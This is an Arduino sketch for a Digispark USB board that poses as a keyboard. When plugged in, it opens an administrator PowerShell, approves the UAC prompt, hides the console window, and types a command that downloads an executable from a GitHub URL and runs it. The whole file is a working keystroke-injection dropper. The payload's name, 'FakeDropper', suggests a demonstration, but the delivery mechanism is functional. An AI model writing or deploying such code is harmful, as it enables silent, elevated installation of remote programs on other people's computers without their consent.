#include <avr/pgmspace.h>
#include "DigiKeyboard.h"

#define URL "https://github.com/thealpiste/OfflineDropper/raw/master/ServiceInstaller/FakeDropper.exe"
#define FILE "FakeDropper.exe"


void digiBegin() {
  DigiKeyboard.sendKeyStroke(0,0);
  DigiKeyboard.delay(50);
}

void digiEnd() {
  const int led=1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(1000);
  }
}

void setup() {
  digiBegin();

  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);

  DigiKeyboard.delay(200);

  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);

  DigiKeyboard.delay(1000);

  DigiKeyboard.println("mode con:cols=18 lines=1");
  
  DigiKeyboard.delay(1000);
    
  DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = '"URL"'; $file = '"FILE"'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

}
/* Unused endless loop */
void loop() {}
